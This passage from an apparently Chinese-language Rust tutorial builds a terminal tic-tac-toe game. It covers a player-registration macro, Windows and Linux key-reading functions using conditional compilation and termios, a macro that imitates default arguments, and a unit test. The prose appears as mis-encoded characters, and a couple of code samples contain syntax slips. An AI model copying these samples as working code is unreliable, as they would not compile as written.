class="keyword">self</span>.board.cells[<span class="keyword">self</span>.current_pos].<span class="title function_ invoke__">is_none</span>() &#123;</span><br><span class="line">                <span class="keyword">self</span>.board.cells[<span class="keyword">self</span>.current_pos] = </span><br><span class="line">                <span class="title function_ invoke__">Some</span>(<span class="keyword">self</span>.players[<span class="keyword">self</span>.current_player].<span class="title function_ invoke__">as_ref</span>().<span class="title function_ invoke__">unwrap</span>().symbol);</span><br><span class="line">                <span class="keyword">self</span>.current_player ^= <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="literal">None</span> =&gt; &#123;&#125;,</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// is win and is full</span></span><br></pre></td></tr></table></figure><h2 id="Register-players"><a href="#Register-players" class="headerlink" title="Register players"></a>Register players</h2><p>ç°åœ¨å¥½åƒplayerè¿˜æ˜¯é»˜è®¤çš„ï¼Œæˆ‘ä»¬å¾—å®ç°ä¼ å‚è‡ªå®šä¹‰ç©å®¶ã€‚æˆ‘ä»¬ä¸ºGameå®ç°ä¸€ä¸ªregister_playeræ¥æ³¨å†Œç©å®¶ï¼Œæ‰€ä»¥åœ¨æ³¨å†Œå‰ç©å®¶æ˜¯ç©ºï¼ˆNoneï¼‰ï¼Œæˆ‘ä»¬æŠŠGameçš„playerå­—æ®µæ”¹æˆ <code>[Option&lt;Player&gt;; 2]</code>ï¼Œå¹¶åœ¨Game::new()åˆå§‹åŒ–ä¸ºNoneã€‚</p><p>register_playeråº”è¯¥æ¥æ”¶ä¸€ä¸ªplayeræ•°ç»„ï¼Œå¹¶ä¸”æŠŠå‰2ä¸ªå¤åˆ¶ç»™Gameï¼Œè¿™é‡Œä¸ºäº†èƒ½é“¾å¼è°ƒç”¨é€‰æ‹©è¿”å›æœ¬èº«</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">impl</span> <span class="title class_">Game</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">register_player</span>(&amp;<span class="keyword">mut</span> <span class="keyword">self</span>, players: &amp;[Player]) <span class="punctuation">-&gt;</span> &amp;<span class="keyword">mut</span> Game &#123;</span><br><span class="line">        <span class="keyword">self</span>.players = [</span><br><span class="line">            <span class="title function_ invoke__">Some</span>(players[<span class="number">0</span>].<span class="title function_ invoke__">clone</span>()),</span><br><span class="line">            <span class="title function_ invoke__">Some</span>(players[<span class="number">1</span>].<span class="title function_ invoke__">clone</span>())</span><br><span class="line">        ];</span><br><span class="line">        <span class="keyword">self</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åä½ å¯ä»¥åœ¨åƒè¿™æ ·è°ƒç”¨</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    Game::<span class="title function_ invoke__">new</span>()</span><br><span class="line">    .<span class="title function_ invoke__">register_player</span>(&amp;<span class="built_in">vec!</span>[</span><br><span class="line">            Player::<span class="title function_ invoke__">new</span>(name: &amp;<span class="type">str</span>, symbol: <span class="type">char</span>),</span><br><span class="line">            Player &#123; name: <span class="string">&quot;B&quot;</span>.<span class="title function_ invoke__">to_string</span>(), symbol: <span class="string">&#x27;O&#x27;</span> &#125;,</span><br><span class="line">    ]).<span class="title function_ invoke__">run</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">Player</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">new</span>(name: &amp;<span class="type">str</span>, symbol: <span class="type">char</span>) <span class="punctuation">-&gt;</span> Player &#123;</span><br><span class="line">        Player &#123;</span><br><span class="line">            name: name.<span class="title function_ invoke__">to_string</span>(),</span><br><span class="line">            symbol,<span class="comment">// å˜é‡åå’Œæˆå‘˜åç›¸åŒå¯ä»¥çœç•¥</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯æ¯”è¾ƒéº»çƒ¦ï¼Œå› ä¸ºä½ æ¯ä¸ªéƒ½è¦newä¸€ä¸‹ï¼Œæœ‰æ²¡æœ‰èƒ½å¤Ÿæ›´åŠ ç®€åŒ–ä¹¦å†™çš„æ–¹å¼å‘¢ï¼Ÿ</p><p>å½“ç„¶æœ‰ï¼Œä½ å¯ä»¥ç”¨å®æ¥å®ç°ã€‚</p><h3 id="ç¼–å†™ä¸€ä¸ªç®€å•çš„å®"><a href="#ç¼–å†™ä¸€ä¸ªç®€å•çš„å®" class="headerlink" title="ç¼–å†™ä¸€ä¸ªç®€å•çš„å®"></a>ç¼–å†™ä¸€ä¸ªç®€å•çš„å®</h3><p>Rustçš„å®éå¸¸å¼ºå¤§ï¼Œå¯ä»¥åšå¾ˆå¤šäº‹æƒ…ï¼Œæ¯”å¦‚ä¸å®šé•¿å‚æ•°ç­‰ç­‰ï¼Œå®ä¸€èˆ¬åˆ†ä¸ºå£°æ˜å®ï¼ˆä¹Ÿå°±æ˜¯é©¬ä¸Šè¦è®²çš„ï¼Œå’Œæ´¾ç”Ÿå®ç­‰ï¼‰ï¼Œç›¸ä¿¡å¤§å®¶åœ¨å‰é¢å·²ç»è§è¯†åˆ°äº†æ´¾ç”Ÿå®çš„å¼ºå¤§äº†ï¼Œæ¥ä¸‹æ¥çœ‹çœ‹å¦‚ä½•å®šä¹‰ä¸€ä¸ªå®ã€‚</p><p>æˆ‘ä»¬å®šä¹‰ä¸€ä¸ªregister_playerå®æ¥å¸®æˆ‘æ›´æ–¹ä¾¿çš„ç”Ÿæˆä¸€ä¸ªPlayeræ•°ç»„</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[macro_export]</span></span><br><span class="line"><span class="built_in">macro_rules!</span> register_player &#123;</span><br><span class="line">    ($($name:expr =&gt; $sym:expr),*) =&gt; &#123;</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// return the start two</span></span><br><span class="line">            <span class="built_in">vec!</span>[$(Player::<span class="title function_ invoke__">new</span>($name, $sym),)*][..<span class="number">2</span>].<span class="title function_ invoke__">to_vec</span>()</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åä½ å¯ä»¥è¿™ä¹ˆè°ƒç”¨ï¼Œè¦æ³¨æ„å®åé¢å¯ä»¥è·Ÿï¼ˆï¼‰, [], {}ï¼Œ è™½ç„¶éƒ½å¯ä»¥ï¼Œä½†æ˜¯ä¸€èˆ¬ä¼šæœ‰ä¸€ä¸ªçº¦å®šçš„å†™æ³•ï¼Œæ¯”å¦‚println!æ˜¯ ()ï¼Œ vec!æ˜¯[]</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    Game::<span class="title function_ invoke__">new</span>()</span><br><span class="line">    .<span class="title function_ invoke__">register_player</span>(</span><br><span class="line">    &amp;register_player!&#123;</span><br><span class="line">                <span class="string">&quot;Player1&quot;</span> =&gt; <span class="string">&#x27;X&#x27;</span>ï¼Œ</span><br><span class="line">                <span class="string">&quot;Player2&quot;</span> =&gt; <span class="string">&#x27;O&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">    ).<span class="title function_ invoke__">run</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>  å®çš„å®šä¹‰å…è®¸åƒmatchä¸€æ ·å†™å¤šä¸ªæ¨¡å¼ï¼Œåªä¸è¿‡å®åŒ¹é…çš„æ˜¯ä¸€æ®µRustæºä»£ç ã€‚</p><p>  register_playerå®æ¥å—ä¸€ç³»åˆ—çš„è¡¨è¾¾å¼ï¼Œæ¯ä¸ªè¡¨è¾¾å¼ç”±ä¸€ä¸ªåå­—å’Œä¸€ä¸ªç¬¦å·ç»„æˆï¼Œç„¶åä¸ºæ¯ä¸ªè¡¨è¾¾å¼åˆ›å»ºä¸€ä¸ªæ–°çš„ <code>Player</code> å¯¹è±¡ã€‚</p><p>  å®çš„å‚æ•°ä½¿ç”¨ <code>$(...),*</code> çš„å½¢å¼å®šä¹‰ï¼Œè¿™è¡¨ç¤ºå®æ¥å—ä»»æ„æ•°é‡çš„å‚æ•°ï¼Œæ¯ä¸ªå‚æ•°éƒ½åº”è¯¥åŒ¹é… <code>...</code> ä¸­çš„æ¨¡å¼ï¼Œå‚æ•°ä¹‹é—´ç”¨é€—å·åˆ†éš”ã€‚</p><p>  åœ¨å®çš„ä¸»ä½“ä¸­ï¼Œé¦–å…ˆä½¿ç”¨ <code>vec!</code> å®åˆ›å»ºä¸€ä¸ª <code>Player</code> å¯¹è±¡çš„å‘é‡ï¼Œæ¯ä¸ª <code>Player</code> å¯¹è±¡éƒ½ä½¿ç”¨ <code>Player::new($name, $sym)</code> åˆ›å»ºã€‚ç„¶åï¼Œä½¿ç”¨ <code>[..2].to_vec()</code> å–å‘é‡çš„å‰ä¸¤ä¸ªå…ƒç´ å¹¶è½¬æ¢ä¸ºæ–°çš„å‘é‡ã€‚</p><p>  æ€»çš„æ¥è¯´ï¼Œè¿™ä¸ªå®çš„ä½œç”¨æ˜¯æ¥å—ä¸€ç³»åˆ—çš„åå­—å’Œç¬¦å·ï¼Œä¸ºæ¯ä¸ªåå­—å’Œç¬¦å·åˆ›å»ºä¸€ä¸ª <code>Player</code> å¯¹è±¡ï¼Œç„¶åè¿”å›å‰ä¸¤ä¸ª <code>Player</code> å¯¹è±¡çš„å‘é‡ã€‚</p></blockquote><h2 id="ä¸ºä¸åŒå¹³å°åˆ†åˆ«å®ç°"><a href="#ä¸ºä¸åŒå¹³å°åˆ†åˆ«å®ç°" class="headerlink" title="ä¸ºä¸åŒå¹³å°åˆ†åˆ«å®ç°"></a>ä¸ºä¸åŒå¹³å°åˆ†åˆ«å®ç°</h2><p>åœ¨ä¸Šé¢æˆ‘ä»¬å®ç°äº†getchåŠŸèƒ½ä½¿ç”¨äº†Cæ¥å£ï¼Œè€Œå…¶ä¸­kbhitæ˜¯åœ¨windowså¹³å°çš„å‡½æ•°ï¼ˆå¦‚æœæ²¡æœ‰è®°é”™åº”è¯¥åœ¨windows.hé‡Œé¢ï¼‰ï¼Œæ‰€ä»¥å¦‚æœä½ å°è¯•ç¼–è¯‘ä¸ºå…¶ä»–å¹³å°çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå°±ä¼šå‡ºé—®é¢˜ï¼Œåœ¨è¿™é‡Œé—®é¢˜å¾ˆå¯èƒ½æ˜¯ç¼–è¯‘æ—¶æ‰¾ä¸åˆ°kbhitè¿™ä¸ªç¬¦å·ã€‚ï¼ˆå¯ä»¥è‡ªå·±ç¼–è¯‘çœ‹çœ‹é”™è¯¯ï¼‰</p><p>é‚£ä¹ˆå¦‚æœèƒ½æ‰¾åˆ°å¤©ç„¶è·¨å¹³å°çš„å®ç°å°±å¥½äº†ï¼ˆæ˜¾ç„¶ä½¿ç”¨çº¯rustä¸ä¼šæœ‰è¿™ç§é—®é¢˜ï¼‰ï¼Œä½†æ˜¯è¿™å¾€å¾€æ¯”è¾ƒå›°éš¾ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥è€ƒè™‘å¦ä¸€ç§æ–¹å¼ï¼Œä¹Ÿå°±æ˜¯ä¸ºä¸åŒçš„å¹³å°åˆ†åˆ«å®ç°ç›¸åº”çš„æ–¹æ³•å³å¯ï¼</p><p>å‡å®šåªè¦ç¼–è¯‘åˆ°windowså’Œlinuxï¼Œæˆ‘ä»¬æ¥æ”¹å†™ä¸€ä¸‹ä¸Šé¢å®ç°çš„getch</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[cfg(target_os = <span class="string">&quot;windows&quot;</span>)]</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">_getch</span>() <span class="punctuation">-&gt;</span> <span class="type">u8</span>;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">_kbhit</span>() <span class="punctuation">-&gt;</span> <span class="type">bool</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬é€šè¿‡cfgæ¥è®¾ç½®ä¸€ä¸ªï¼ˆå—ï¼‰è¯­å¥çš„æŸäº›å±æ€§ï¼Œè¿™é‡Œæ˜¯æŒ‡å®šè¿™æ®µä»£ç åªåœ¨windowså¹³å°æœ‰æ•ˆï¼Œåªæœ‰ç¼–è¯‘æˆwindowså¹³å°çš„å¯æ‰§è¡Œæ–‡ä»¶æ‰ä¼šç¼–è¯‘è¿™éƒ¨åˆ†ã€‚</p><p>åŒæ ·æˆ‘ä»¬ä¹Ÿç»™getchæ ‡ä¸Šï¼ˆè¿™é‡Œæ”¹äº†ä¸ªåå­—ï¼Œå› ä¸ºæ„Ÿè§‰keyä¼šæ›´åˆé€‚ä¸€ç‚¹ï¼‰</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[cfg(target_os = <span class="string">&quot;windows&quot;</span>)]</span></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">getkey</span>(on_blocking: <span class="type">bool</span>) <span class="punctuation">-&gt;</span> <span class="type">Option</span>&lt;<span class="type">u8</span>&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> on_blocking || <span class="keyword">unsafe</span> &#123; _kbhit() &#125; &#123;</span><br><span class="line">        <span class="keyword">unsafe</span> &#123; <span class="title function_ invoke__">Some</span>(_getch()) &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="literal">None</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥è¦å†™linuxéƒ¨åˆ†çš„å®ç°äº†ï¼Œlinuxé‡Œå¹¶æ²¡æœ‰ï¼ˆå¤§æ¦‚ï¼Ÿï¼‰ç›´æ¥æä¾›ç±»ä¼¼kbhitçš„å‡½æ•°ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥åœ¨è¯»ä¸€ä¸ªå­—èŠ‚åè¿”å›ã€‚</p><p>æˆ‘ä»¬å¾—å…ˆå¯¼å…¥libcåº“ <code>cargo add libc</code></p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[cfg(target_os = <span class="string">&quot;linux&quot;</span>)]</span></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">crate</span> libc;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[cfg(target_os = <span class="string">&quot;linux&quot;</span>)]</span></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">getkey</span>(on_blocking: <span class="type">bool</span>) <span class="punctuation">-&gt;</span> <span class="type">Option</span>&lt;<span class="type">u8</span>&gt; &#123;</span><br><span class="line">    <span class="comment">// å»ºè®®ç›´æ¥åœ¨å‡½æ•°å†…éƒ¨useå°±å¯ä»¥äº†ï¼Œæ¯•ç«Ÿå¦‚æœä¸æ˜¯linuxå¹³å°ä¹Ÿç”¨ä¸åˆ°</span></span><br><span class="line">    <span class="keyword">use</span> libc::&#123;termios, ECHO, ICANON, TCSANOW, VMIN, VTIME&#125;;</span><br><span class="line">    <span class="keyword">use</span> std::io::&#123;stdin, Read&#125;;</span><br><span class="line">    <span class="keyword">use</span> std::mem::zeroed;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">termios</span> = <span class="keyword">unsafe</span> &#123; zeroed::&lt;termios&gt;() &#125;;</span><br><span class="line">    <span class="keyword">unsafe</span> &#123; libc::<span class="title function_ invoke__">tcgetattr</span>(<span class="number">0</span>, &amp;<span class="keyword">mut</span> termios) &#125;;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">old</span> = termios;</span><br><span class="line">    termios.c_lflag &amp;= !(ICANON | ECHO);</span><br><span class="line">    termios.c_cc[VMIN] = <span class="keyword">if</span> on_blocking &#123; <span class="number">1</span> &#125; <span class="keyword">else</span> &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    termios.c_cc[VTIME] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsafe</span> &#123; libc::<span class="title function_ invoke__">tcsetattr</span>(<span class="number">0</span>, TCSANOW, &amp;termios) &#125;;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">buf</span> = [<span class="number">0_u8</span>; <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">res</span> = <span class="keyword">if</span> <span class="title function_ invoke__">stdin</span>().<span class="title function_ invoke__">read</span>(&amp;<span class="keyword">mut</span> buf).<span class="title function_ invoke__">is_ok</span>() &#123;</span><br><span class="line">        <span class="title function_ invoke__">Some</span>(buf[<span class="number">0</span>])</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="literal">None</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">unsafe</span> &#123; libc::<span class="title function_ invoke__">tcsetattr</span>(<span class="number">0</span>, TCSANOW, &amp;old) &#125;;</span><br><span class="line">    res</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>  é¦–å…ˆï¼Œè¿™æ®µä»£ç ä½¿ç”¨äº†æ¡ä»¶ç¼–è¯‘ï¼ˆ<code>#[cfg(target_os = &quot;linux&quot;)]</code>ï¼‰ï¼Œè¿™æ„å‘³ç€è¿™æ®µä»£ç åªæœ‰åœ¨ç›®æ ‡æ“ä½œç³»ç»Ÿä¸º Linux æ—¶æ‰ä¼šç¼–è¯‘å’Œè¿è¡Œã€‚</p><p>  ç„¶åï¼Œå‡½æ•° <code>getkey</code> æ¥å—ä¸€ä¸ªå¸ƒå°”å‚æ•° <code>on_blocking</code>ï¼Œç”¨äºæŒ‡å®šæ˜¯å¦åœ¨ç­‰å¾…ç”¨æˆ·è¾“å…¥æ—¶é˜»å¡ã€‚</p><p>  åœ¨å‡½æ•°å†…éƒ¨ï¼Œé¦–å…ˆä½¿ç”¨ <code>libc</code> åº“çš„ <code>termios</code> ç»“æ„ä½“æ¥è·å–å’Œè®¾ç½®ç»ˆç«¯çš„ I&#x2F;O å±æ€§ã€‚<code>termios</code> ç»“æ„ä½“ä¸­çš„ <code>c_lflag</code> å­—æ®µç”¨äºæ§åˆ¶è¾“å…¥æ¨¡å¼ï¼Œ<code>ICANON</code> å’Œ <code>ECHO</code> æ˜¯ä¸¤ä¸ªæ ‡å¿—ä½ï¼Œåˆ†åˆ«ç”¨äºæ§åˆ¶è§„èŒƒæ¨¡å¼ï¼ˆå³è¡Œç¼“å†²ï¼‰å’Œå›æ˜¾ã€‚é€šè¿‡å°†è¿™ä¸¤ä¸ªæ ‡å¿—ä½æ¸…é›¶ï¼Œå‡½æ•°è®¾ç½®ç»ˆç«¯ä¸ºéè§„èŒƒæ¨¡å¼å’Œéå›æ˜¾æ¨¡å¼ï¼Œè¿™æ ·å°±å¯ä»¥ç«‹å³è¯»å–ç”¨æˆ·çš„æ¯ä¸€ä¸ªé”®å…¥ï¼Œè€Œä¸éœ€è¦ç­‰å¾…å›è½¦é”®ã€‚</p><p>  <code>termios</code> ç»“æ„ä½“ä¸­çš„ <code>c_cc</code> å­—æ®µæ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œç”¨äºæ§åˆ¶ç‰¹æ®Šå­—ç¬¦çš„è¡Œä¸ºã€‚<code>VMIN</code> å’Œ <code>VTIME</code> æ˜¯æ•°ç»„ä¸­çš„ä¸¤ä¸ªç´¢å¼•ï¼Œåˆ†åˆ«ç”¨äºæ§åˆ¶åœ¨éè§„èŒƒæ¨¡å¼ä¸‹çš„æœ€å°è¯»å–å­—ç¬¦æ•°å’Œè¶…æ—¶æ—¶é—´ã€‚é€šè¿‡è®¾ç½® <code>VMIN</code> ä¸º <code>on_blocking</code> å‚æ•°ï¼ˆå¦‚æœ <code>on_blocking</code> ä¸º <code>true</code>ï¼Œåˆ™ <code>VMIN</code> ä¸º 1ï¼Œå¦åˆ™ä¸º 0ï¼‰ï¼Œå‡½æ•°å¯ä»¥åœ¨æ²¡æœ‰è¾“å…¥æ—¶ç«‹å³è¿”å›ï¼Œè€Œä¸æ˜¯ç­‰å¾…ç”¨æˆ·è¾“å…¥ã€‚<code>VTIME</code> è¢«è®¾ç½®ä¸º 0ï¼Œè¡¨ç¤ºä¸ä½¿ç”¨è¶…æ—¶ã€‚</p><p>  ç„¶åï¼Œå‡½æ•°ä½¿ç”¨ <code>stdin().read(&amp;mut buf)</code> ä»æ ‡å‡†è¾“å…¥è¯»å–ä¸€ä¸ªå­—ç¬¦åˆ° <code>buf</code> ä¸­ã€‚å¦‚æœè¯»å–æˆåŠŸï¼Œå‡½æ•°è¿”å›è¯»å–åˆ°çš„å­—ç¬¦ï¼Œå¦åˆ™è¿”å› <code>None</code>ã€‚</p><p>  æœ€åï¼Œå‡½æ•°ä½¿ç”¨ <code>libc::tcsetattr(0, TCSANOW, &amp;old)</code> æ¢å¤ç»ˆç«¯çš„åŸå§‹ I&#x2F;O å±æ€§ã€‚</p></blockquote><p>å½“ç„¶åˆ°è¿™é‡Œå…¶å®ä¹Ÿå¯ä»¥äº†ï¼Œä½†æ˜¯è¯»è€…è‚¯å®šä¸ä¼šä¹°è´¦çš„ï¼Œå› ä¸ºæ¯æ¬¡è°ƒç”¨è¿˜å¿…é¡»æŒ‡å®šboolï¼Œæˆ‘å°±ä¸èƒ½åƒå…¶ä»–è¯­è¨€ä¸€æ ·æ•´ä¸ªé»˜è®¤å‚æ•°å—ã€‚</p><p>ç”±äºrustçš„å‡½æ•°æ˜¯ä¸æ”¯æŒé»˜è®¤å‚æ•°çš„ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥ç”¨å®æ¥å®ç°ç±»ä¼¼çš„åŠŸèƒ½ã€‚</p><p>å‰é¢æœ‰æè¿‡å®å¯ä»¥åƒmatchä¸€æ ·åŒ¹é…æ¨¡å¼ï¼Œæˆ‘ä»¬è¿™é‡Œä¸å¦¨å°±è®¾ç½®2ç§æ¨¡å¼ï¼Œå¯¹åº”é˜»å¡å’Œéé˜»å¡ã€‚æˆ‘ä»¬ç®€å•æŠŠæˆ‘ä»¬çš„å‡½æ•°åŒ…è£…ä¸€ä¸‹ã€‚</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[macro_export]</span></span><br><span class="line"><span class="built_in">macro_rules!</span> getkey &#123;</span><br><span class="line">    () =&gt; &#123;</span><br><span class="line">        <span class="title function_ invoke__">getkey</span>(<span class="literal">false</span>)</span><br><span class="line">    &#125;;</span><br><span class="line">    (block) =&gt; &#123;</span><br><span class="line">        <span class="title function_ invoke__">getkey</span>(<span class="literal">true</span>)</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ ·å¦‚æœä½ ä½¿ç”¨æ¯”å¦‚ <code>getkey!()</code>ï¼Œ å°±ä¼šä¸é˜»å¡ã€‚å¦‚æœä½¿ç”¨<code>getkey!(block)</code>ï¼Œå°±ä¼šé˜»å¡ç­‰å¾…ç”¨æˆ·è¾“å…¥äº†ã€‚è¿™é‡Œé¢çš„blockå¹¶ä¸æ˜¯ä¸€ä¸ªå˜é‡ï¼Œåªæ˜¯ä¸€ä¸ªæ¨¡å¼ã€‚æ‰€ä»¥ä½ æ— é¡»å®šä¹‰blockä¸ºä¸€ä¸ªå…·ä½“çš„ä¸œè¥¿ï¼Œä½ å½“ç„¶å¯ä»¥å†™æˆå…¶ä»–çš„ï¼šD</p><h2 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h2><h3 id="ç¼–å†™ç®€å•æµ‹è¯•"><a href="#ç¼–å†™ç®€å•æµ‹è¯•" class="headerlink" title="ç¼–å†™ç®€å•æµ‹è¯•"></a>ç¼–å†™ç®€å•æµ‹è¯•</h3><p>æœ‰æ—¶å€™ä½ æƒ³æµ‹è¯•æŸä¸ªæˆ–ç€è¯´ä¸€éƒ¨åˆ†åŠŸèƒ½ï¼Œç›´æ¥ç¼–è¯‘æ•´ä¸ªé¡¹ç›®å†æµ‹è¯•æ˜¯éå¸¸ä½æ•ˆçš„åšæ³•ã€‚è¿™ç§æƒ…å†µéå¸¸å»ºè®®ä½ å†™testæ¨¡å—ã€‚</p><p>å‡å®šæˆ‘ä»¬è¦æµ‹è¯•æˆ‘ä»¬å†™çš„register_playerå®æ˜¯å¦èƒ½æŒ‰ç…§æˆ‘ä»¬æƒ³çš„é‚£æ ·è¿ä½œï¼Œå¯ä»¥åƒè¿™æ ·å†™ä¸ªæµ‹è¯•å‡½æ•°</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[cfg(test)]</span></span><br><span class="line"><span class="keyword">mod</span> test &#123;</span><br><span class="line">    <span class="keyword">use</span> super::*;</span><br><span class="line"></span><br><span class="line">    <span class="meta">#[test]</span></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">player_reg</span>() &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">players</span> = register_player!(</span><br><span class="line">            <span class="string">&quot;Player 1&quot;</span> =&gt; <span class="string">&#x27;X&#x27;</span>,</span><br><span class="line">            <span class="string">&quot;Player 2&quot;</span> =&gt; <span class="string">&#x27;O&#x27;</span></span><br><span class="line">        );</span><br><span class="line">        <span class="comment">/* dbg!(players);</span></span><br><span class="line"><span class="comment">        assert!(false); */</span></span><br><span class="line">        <span class="built_in">assert_eq!</span>(</span><br><span class="line">            players,</span><br><span class="line">            <span class="built_in">vec!</span>[Player::<span class="title function_ invoke__">new</span>(<span class="string">&quot;Player 1&quot;</span>, <span class="string">&#x27;X&#x27;</span>), Player::<span class="title function_ invoke__">new</span>(<span class="string">&quot;Player 2&quot;</span>, <span class="string">&#x27;O&#x27;</span>)]</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶ååœ¨ä½ çš„ç»ˆç«¯è¿è¡Œ <code>cargo test</code></p><p>å¦‚æœæ­£å¸¸å°±åªèƒ½çœ‹åˆ°okï¼Œå‡ºé”™å°±ä¼šçœ‹åˆ°ä½ çš„è¾“å‡ºå’Œé”™è¯¯ä¿¡æ¯ã€‚ä¸€èˆ¬å¦‚æœæˆ‘ä»¬ç¡®å®šå¤§æ¦‚ä¼šæœ‰ä¸ªä»€ä¹ˆè¾“å‡ºï¼Œæˆ‘ä»¬å°±ç”¨assertç³»åˆ—çš„å®ï¼Œè¿™å¾ˆå¥½ç†è§£ã€‚å½“æˆ‘ä»¬æƒ³è¦æ¯”è¾ƒçš„å†…å®¹å¤ªå¤šï¼Œä½ æ‡’å¾—è¾“å…¥ï¼Œä½ 